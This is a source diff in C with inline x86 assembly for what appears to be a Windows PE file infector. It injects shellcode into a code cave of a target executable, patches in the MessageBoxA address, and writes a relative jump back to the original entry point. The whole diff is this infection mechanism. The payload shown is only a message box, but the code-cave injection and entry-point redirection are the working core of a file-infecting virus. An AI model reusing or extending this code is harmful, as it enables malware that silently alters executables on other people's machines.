@@ -1,11 +1,15 @@
 #include <Windows.h>
 #include "exe.h"
+#include "shellcode.h"
 
 #pragma warning(disable : 4996)
 
 #define NOP_COUNT 30
+#define MESSAGEBOX_ADDRESS_PLACE_HOLDER 0xAAAAAAAA
+#define ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER 0xBBBBBBBB
+#define RELATIVE_JUMP_OPCODE 0xE9
 
-__declspec(naked) shellcode(VOID) {
+void __declspec(naked) shellcode(VOID) {
     __asm {
         call    routine
 
@@ -18,13 +22,11 @@ __declspec(naked) shellcode(VOID) {
             lea     eax, [ebp + szText]
             push    eax                              // lpText
             push    0                                // hWnd
-            mov     eax, 0xAAAAAAAA                  // move eax messagebox address
+            mov     eax, MESSAGEBOX_ADDRESS_PLACE_HOLDER                  // move eax messagebox address
             call    eax                              // MessageBoxA
 
             popad
-            popad
-            push    0xBBBBBBBB
-            ret
+            mov eax, ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER
             //mov     eax, 0xBBBBBBBB                 // move eax relative jump offset
             //jmp before_call
 
@@ -76,6 +78,20 @@ __declspec(naked) shellcode(VOID) {
     }
 }
 
+DWORD get_relative_jump(EXE_file* infected, DWORD jump_address)
+{
+    int relative_jump = 0;
+    // Adding the address size (jumping from end of jump instruction).
+    relative_jump = jump_address + 4;
+
+    // switch from row data to RVA.
+    relative_jump = relative_jump - (DWORD)infected->mapped_handle - (DWORD)infected->last_section->PointerToRawData + (DWORD)infected->last_section->VirtualAddress;
+    // switch to virtual address.
+    relative_jump += (DWORD)infected->headers->OptionalHeader.ImageBase;
+    relative_jump = (DWORD)infected->entry_address - relative_jump;
+    return relative_jump;
+}
+
 LPVOID set_addrress_in_shellcode(EXE_file* infected, LPBYTE codecave_address, DWORD shellcode_size)
 {
 
@@ -86,12 +102,13 @@ LPVOID set_addrress_in_shellcode(EXE_file* infected, LPBYTE codecave_address, DW
     LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");
     DWORD relative_jump = 0;
     DWORD offset = 0;
-    long* current_call_address = 0;
+    DWORD* current_call_address = NULL;
+    PCHAR address_of_relative_jump = NULL;
     PVOID reloction_end = NULL;
     do
     {
         current_call_address = (PCHAR)codecave_address + offset;
-        if (*current_call_address == 0xAAAAAAAA) {
+        if (*current_call_address == MESSAGEBOX_ADDRESS_PLACE_HOLDER) {
             // insert function's address
             *current_call_address = (DWORD)lpAddress;
             FreeLibrary(hModule);
@@ -104,11 +121,13 @@ LPVOID set_addrress_in_shellcode(EXE_file* infected, LPBYTE codecave_address, DW
     {
         // modify OEP address offset
         current_call_address = (PCHAR)codecave_address + offset;
-        if (*current_call_address == 0xBBBBBBBB) {
+        if (*current_call_address == ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER) {
+            
+            address_of_relative_jump = (PCHAR)current_call_address - 1;
+            *address_of_relative_jump = RELATIVE_JUMP_OPCODE;
             // insert address of entry point
-            *current_call_address = infected->entery_address;
-
-
+            relative_jump = get_relative_jump(infected, (DWORD)current_call_address);
+            *current_call_address = relative_jump;
             break;
         }
         offset++;
@@ -124,7 +143,7 @@ DWORD get_shellcode_size()
 {
     int counter = 0;
     //random offset to fix bug.
-    char* func_pointer = (char*)shellcode + 0x1070;
+    char* func_pointer = (char*)shellcode + SHELLCODE_ADDRESS_BUG;
     unsigned char current_char = 0;
     do
     {
